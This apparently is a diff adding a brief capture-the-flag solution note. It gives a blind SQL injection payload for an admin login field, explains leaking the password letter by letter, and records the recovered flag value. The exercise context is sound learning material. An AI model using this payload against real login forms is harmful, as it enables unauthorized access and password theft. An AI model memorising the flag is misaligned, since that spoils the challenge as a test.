@@ -1,0 +1,6 @@
+user: admin
+pass: ' OR pass LIKE 'a%
+
+where a is every letter of the alphabet. Blind SQL leaks the admin's password.
+
+password: not_all_errors_should_be_shown_faa8380e951439eebb3d452b5e86f3f9
